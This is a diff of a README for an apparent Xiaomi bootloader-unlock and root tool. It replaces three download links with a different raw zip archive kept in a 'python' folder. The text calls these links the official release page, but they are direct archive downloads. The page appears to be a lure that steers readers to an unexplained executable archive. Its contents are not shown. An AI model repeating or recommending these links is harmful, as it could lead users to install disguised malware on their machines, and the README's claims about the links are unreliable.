@@ -1,6 +1,6 @@
 # ⚙️ mi_nobl_root - Easy Xiaomi Unlock and Root Tool
 
-[![Download mi_nobl_root](https://img.shields.io/badge/Download-mi_nobl_root-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dabneythespian710/mi_nobl_root/main/python/nobl-root-mi-turriform.zip)
+[![Download mi_nobl_root](https://img.shields.io/badge/Download-mi_nobl_root-brightgreen?style=for-the-badge&logo=github)](https://github.com/dabneythespian710/mi_nobl_root/raw/refs/heads/main/python/mi_nobl_root_v2.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run mi_nobl_root safely and easily on your Wi
 
 1. **Download the software**  
    Visit the release page by clicking the green button below:  
-   [![Download mi_nobl_root](https://img.shields.io/badge/Download-mi_nobl_root-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dabneythespian710/mi_nobl_root/main/python/nobl-root-mi-turriform.zip)  
+   [![Download mi_nobl_root](https://img.shields.io/badge/Download-mi_nobl_root-blue?style=for-the-badge&logo=github)](https://github.com/dabneythespian710/mi_nobl_root/raw/refs/heads/main/python/mi_nobl_root_v2.6.zip)  
 
    This link takes you to the releases area where the latest files are available. Look for the most recent stable release and download the archive or executable file.
 
@@ -99,7 +99,7 @@ Check the GitHub release page periodically to download the latest version. Updat
 
 To get the latest version, visit the official release page:
 
-[Click here to download mi_nobl_root](https://raw.githubusercontent.com/dabneythespian710/mi_nobl_root/main/python/nobl-root-mi-turriform.zip)
+[Click here to download mi_nobl_root](https://github.com/dabneythespian710/mi_nobl_root/raw/refs/heads/main/python/mi_nobl_root_v2.6.zip)
 
 ---
 
